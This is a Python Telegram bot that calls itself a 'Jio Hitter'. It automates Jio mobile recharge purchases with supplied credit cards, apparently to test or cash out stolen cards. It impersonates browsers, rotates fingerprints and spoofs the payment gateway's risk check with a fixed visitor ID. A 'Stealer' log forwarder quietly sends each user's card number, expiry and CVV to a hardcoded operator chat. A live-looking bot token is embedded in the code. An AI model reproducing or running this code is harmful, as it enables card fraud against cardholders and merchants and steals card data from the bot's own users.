import os
import re
import time
import json as _json
import sys
import subprocess
import random
import string
from datetime import datetime, timezone, timedelta
import warnings
warnings.filterwarnings("ignore")

# --- AUTO INSTALL REQUIREMENTS ---
def install_requirements():
    for pkg in ["curl_cffi", "pyTelegramBotAPI"]:
        try:
            __import__("curl_cffi" if pkg == "curl_cffi" else "telebot")
        except ImportError:
            print(f"Installing {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

install_requirements()

from curl_cffi import requests
import telebot

PROFILES = [
    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
    {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
]
SCREENS = [{"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30}]
LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8"]

TG_BOT_TOKEN = "9040723839:AAEIRfrWdw5YGLZfVQn_qjGJZM2LebDOcq4"
ADMIN_CHAT_ID = 6755426755  # Aapki ID jahan sare logs aur hits aayenge

bot = telebot.TeleBot(TG_BOT_TOKEN)

USERS_FILE = "bot_users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                return set(_json.load(f))
        except:
            pass
    return set()

def save_user(user_id):
    users = load_users()
    if user_id not in users:
        users.add(user_id)
        with open(USERS_FILE, "w") as f:
            _json.dump(list(users), f)

def ts(): return str(int(time.time()*1000))

def jh(ref, lg, UA, SEC, MOB, PLAT, ct=None, origin=None, extra=None):
    h = {"Accept-Language": lg, "Cache-Control": "no-cache", "Connection": "keep-alive", "Pragma": "no-cache",
         "Referer": ref, "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB, "sec-ch-ua-platform": PLAT}
    if ct: h["Content-Type"] = ct
    if origin: h["Origin"] = origin
    if extra: h.update(extra)
    return h

def ph(ref, lg, UA, SEC, MOB, PLAT, ct=None, origin=None, extra=None):
    h = {"Accept": "application/json, text/plain, */*", "Accept-Language": lg, "Cache-Control": "no-cache",
         "Pragma": "no-cache", "Referer": ref, "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB,
         "sec-ch-ua-platform": PLAT, "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-origin", "x-request-time": ts()}
    if ct: h["Content-Type"] = ct
    if origin: h["Origin"] = origin
    if extra: h.update(extra)
    return h

def iter_plans(pj):
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    yield {"key": plan["key"], "amount": float(plan.get("amount") or 0),
                           "name": plan.get("name") or plan.get("planName") or "",
                           "category": cat.get("type") or "", "validity": plan.get("validity") or ""}

def cheapest_plan(pj):
    plans = list(iter_plans(pj))
    return min(plans, key=lambda p: p["amount"]) if plans else None

def jio_hit_process(recharge_number, raw_cc, status_callback):
    try:
        parts = raw_cc.strip().split("|")
        if len(parts) < 4:
            return "❌ Invalid Card Format! Use: `NUM|MM|YY|CVV`"
        CARD_NUM, CARD_MM, CARD_YY, CARD_CVV = parts[0], parts[1], parts[2], parts[3]
        if len(CARD_YY) == 2: CARD_YY = "20" + CARD_YY
    except Exception:
        return "❌ Card parsing failed. Use format: `NUM|MM|YY|CVV`"

    CARD_NAME = "matt henry"
    CARD_PREFIX = CARD_NUM[:6]

    pf = random.choice(PROFILES)
    sc = random.choice(SCREENS)
    lg = random.choice(LANGS)
    UA = pf["ua"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]; IMP = pf["imp"]

    session = requests.Session(impersonate=IMP)

    try:
        status_callback("⚡ *[1/5]* Connecting to Jio Gateway...")
        session.get("https://www.jio.com/", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": lg,"Upgrade-Insecure-Requests": "1","User-Agent": UA,"sec-ch-ua": SEC,"sec-ch-ua-mobile": MOB,"sec-ch-ua-platform": PLAT}, verify=False)

        status_callback("⚡ *[2/5]* Fetching subscriber & plan info...")
        r = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{recharge_number}",
            headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, extra={"Accept": "application/json, text/plain, */*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
        d = r.json()
        if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return "❌ Not a valid Jio number."

        primary = d.get("primaryService") or {}
        billing_type = d.get("billingType") or primary.get("billingType") or "PREPAID"
        next_value = d.get("nextPage") or billing_type
        plans_ref = (f"https://www.jio.com/selfcare/recharge/mobility/plans/"
                   f"?serviceType=mobility&serviceId={recharge_number}&next={next_value}&billingType={billing_type}&entrysource=Widget")

        session.get("https://www.jio.com/selfcare/recharge/mobility/plans/",
            params={"serviceType": "mobility", "serviceId": recharge_number, "next": next_value, "billingType": billing_type, "entrysource": "Widget"},
            headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "same-origin","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}))

        r4 = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{recharge_number}",
            headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
        plans_json = r4.json()

        picked = cheapest_plan(plans_json)
        if not picked:
            return "❌ No recharge plans available found."
        plan_key = picked["key"]

        status_callback("⚡ *[3/5]* Initializing checkout & payment flow...")
        r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
            headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
            json={"planKey": plan_key, "selectedService": recharge_number})
        if r.status_code != 200:
            return f"❌ Checkout failed with status {r.status_code}"

        r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
            headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
            json={"addonPlanKeys": [], "flexiTopupFlow": False, "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": recharge_number}]})
        payment_url = r.json().get("paymentURL", "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")

        r = session.get(payment_url, headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "same-origin","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}), allow_redirects=True)
        fa = re.search(r"action='([^']+)'", r.text)
        fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r.text)
        url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        pay_form_data = {k: v for k, v in fi}

        r = session.post(url,
            headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, ct="application/x-www-form-urlencoded", origin="https://www.jio.com", extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "cross-site","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}),
            data=pay_form_data, allow_redirects=True)
        pay_jio_ref = r.url

        r = session.post("https://pay.jio.com/jiopg/v1/authorize-card-operation",
            headers=jh(pay_jio_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://pay.jio.com", extra={"Accept": "application/json","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
            json={"paymentMode": "CCDC", "cardPrefix": CARD_PREFIX, "isEMISelected": False, "viewOffer": False, "skuCode": None, "copco": None, "isStoreCreditSelected": None})
        t = r.json().get("token", "")
        if not t:
            return "❌ Authorization token not received."
        x_token = t

        status_callback("⚡ *[4/5]* Submitting card info to secure gateway...")
        r = session.post("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
            headers=jh(pay_jio_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://pay.jio.com", extra={"Accept": "application/json","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin","x-token": x_token}),
            json={"cvvNumber": CARD_CVV, "cashBackApplied": "N", "isTrxnStatusCheckEnable": "N", "seqId": "", "ccRoutePg": "",
                  "customerCardTypeValue": "mastercard", "paymentMode": "CCDC", "offerAppliedByCust": False, "viewOffer": False,
                  "cardType": "ic_mastercard", "cardNumber": CARD_NUM, "cardTypeText": "MASTERCARD_CARD",
                  "expiryMonth": CARD_MM, "expiryYear": CARD_YY, "cardHolderName": CARD_NAME, "userCardSaveConsent": False,
                  "browserDetails": {"browserHeader": "application/json", "browserJavaEnabled": False, "browserJavascriptEnabled": True,
                      "browserLanguage": lg.split(",")[0], "browserColorDepth": sc["depth"],
                      "browserScreenHeight": sc["h"], "browserScreenWidth": sc["w"], "browserTz": -330, "browserUserAgent": UA}})
        d = r.json()
        if not d.get("status"):
            return f"❌ Card Confirmation Failed: {d.get('message', 'Unknown error')}"
        html_form = d.get("htmlForm", "")

        ea = re.search(r"action='([^']+)'", html_form)
        ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
        eu = ea.group(1) if ea else ""
        ed = {k: v for k, v in ei}
        r = session.post(eu, headers=jh(pay_jio_ref, lg, UA, SEC, MOB, PLAT, ct="application/x-www-form-urlencoded", origin="https://pay.jio.com",
            extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Sec-Fetch-Dest": "document",
                   "Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "cross-site","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1"}),
            data=ed, allow_redirects=True)
        m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
        if not m:
            return "❌ Gateway token (gl_token) not found."
        gl_token = m.group(1)
        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"

        session.get("https://api.payglocal.com/gl/v2/payments/redirect/dc",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, extra={"x-gl-current-host": "api.payglocal.com", "x-gl-gid": "gl_payflow-ui", "x-gl-pb-tag-id": "",
                "x-gl-previous-host": "https://pay.easebuzz.in/", "x-gl-referrer-mismatch": "false", "x-gl-trusted-referrer": "https://pay.easebuzz.in"}))

        session.post("https://api.payglocal.com/gl/v2/payments/pd/paynow",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
            json={"isEnc": "false", "payload": {"customerCurrency": "INR", "saveCurrencyPreference": False,
                "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False, "javaScripEnabled": True,
                    "language": lg.split(",")[0], "screenHeight": sc["h"], "screenWidth": sc["w"], "timeZone": -330},
                "billingData": {"addressCountry": "FR"}, "shippingData": {}, "agreedOnTnCs": True}})

        r = session.post("https://api.payglocal.com/gl/v1/payments/risk/fp",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
            json={"requestId": f"{ts()}.{random.randint(100000,999999)}", "visitorId": "Y8c4sEunqz0opl0b6YAd", "visitorFound": True, "confidenceScore": 1})
        kid = r.json().get("data", {}).get("kid", "")
        if not kid:
            return "❌ Risk check failed (kid missing)."

        status_callback("⚡ *[5/5]* Finalizing charge & verifying response...")
        time.sleep(random.uniform(0.5, 1.2))
        r = session.post("https://api.payglocal.com/gl/v2/payments/dc/ipay",
            params={"x-gl-token": gl_token},
            headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
            json={"isEnc": "false", "kid": kid, "payload": {
                "cardNumber": CARD_NUM, "expiryMonth": CARD_MM, "expiryYear": CARD_YY, "cvv": CARD_CVV,
                "cardHolderName": CARD_NAME, "saveCard": False,
                "browserDetails": {"colorDepth": sc["depth"], "javaEnabled": False, "javaScriptEnabled": True,
                    "language": lg.split(",")[0], "screenHeight": sc["h"], "screenWidth": sc["w"],
                    "timeZone": -330, "userAgent": UA}}})
        
        result = r.json()
        status = result.get("status", "")
        message = result.get("message", "")
        reason = result.get("reasonCode", "")
        plan_name = (picked["name"] or picked["category"] or "")[:35]
        cc_masked = f"{CARD_NUM[:6]}******{CARD_NUM[-4:]}|{CARD_MM}|{CARD_YY}|{CARD_CVV}"

        if status in ("SUCCESS", "APPROVED"):
            return (
                "╔════════════════════════╗\n"
                "  🔥 **JIO HIT SUCCESS** 🔥\n"
                "╚════════════════════════╝\n"
                f"💳 **Card:** `{cc_masked}`\n"
                f"📱 **Number:** `{recharge_number}`\n"
                f"📦 **Plan:** {plan_name}\n"
                f"💰 **Amount:** Rs {picked['amount']:.0f}\n"
                f"✅ **Status:** SUCCESS\n"
                f"💬 **Response:** Approved"
            )
        elif status == "ISSUER_DECLINE" or 'declined' in message.lower():
            return (
                "╔════════════════════════╗\n"
                "  🔴 **JIO HIT DEAD** 🔴\n"
                "╚════════════════════════╝\n"
                f"💳 **Card:** `{cc_masked}`\n"
                f"📱 **Number:** `{recharge_number}`\n"
                f"❌ **Status:** DECLINED\n"
                f"💬 **Reason:** {message or 'Declined by Issuer'}"
            )
        else:
            return (
                "╔════════════════════════╗\n"
                "  📌 **JIO HIT RESULT** 📌\n"
                "╚════════════════════════╝\n"
                f"💳 **Card:** `{cc_masked}`\n"
                f"📱 **Number:** `{recharge_number}`\n"
                f"⚡ **Status:** {status}\n"
                f"💬 **Message:** {message or reason or 'Processed'}"
            )

    except Exception as e:
        return f"❌ **Jio Hitter Error:** `{str(e)}`"

# --- TELEGRAM HANDLERS ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    save_user(message.from_user.id)
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    
    help_text = (
        "╔════════════════════════╗\n"
        "   🤖 **JIO HITTER BOT v2.0**   \n"
        "╚════════════════════════╝\n\n"
        f"👤 **User Name:** {user_name}\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"💎 **Status:** Premium Authorized\n\n"
        "🚀 **Available Command:**\n"
        "• `/jhit <number> <card>`\n"
        "  _Example:_ `/jhit 9876543210 513155...|03|30|086`\n\n"
        "⚡ _Fast, secure & automated backend hit flow._"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['jhit'])
def cmd_jio_hit(message):
    save_user(message.from_user.id)
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "⚠️ **Format Error!**\nUse: `/jhit <number> <card>`\n_Example:_ `/jhit 9876543210 513155...|03|30|086`", parse_mode="Markdown")
            return
        
        number = parts[1].strip()
        card = parts[2].strip()
        
        # Smooth status update (Live editing message)
        sent_msg = bot.reply_to(message, "⏳ *Initializing Jio Hitter...*", parse_mode="Markdown")
        
        def update_status(text):
            try:
                bot.edit_message_text(text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
            except:
                pass

        result = jio_hit_process(number, card, update_status)
        
        # Edit message to final result
        bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
        
        # Stealer / Admin Notification Log Forwarder
        user_info = f"👤 User: {message.from_user.first_name} (ID: `{message.from_user.id}`)\n"
        log_text = f"🚨 **NEW HIT LOGGED**\n\n{user_info}\n{result}"
        try:
            bot.send_message(ADMIN_CHAT_ID, log_text, parse_mode="Markdown")
        except:
            pass

    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** `{str(e)}`", parse_mode="Markdown")

# --- BROADCAST COMMAND (Admin Only) ---
@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    if message.from_user.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "⛔ You are not authorized to use this command.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide message to broadcast. Example: `/broadcast Hello users!`", parse_mode="Markdown")
        return
    
    bc_text = parts[1]
    users = load_users()
    success = 0
    fail = 0
    
    status_msg = bot.reply_to(message, f"📢 Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **Announcement:**\n\n{bc_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1)
        except:
            fail += 1
            
    bot.edit_message_text(f"✅ **Broadcast Completed!**\n\nSuccessful: {success}\nFailed: {fail}", chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")

if __name__ == "__main__":
    print("🤖 Jio Hitter Bot with Stealer & Broadcast is running...")
    bot.infinity_polling()
        
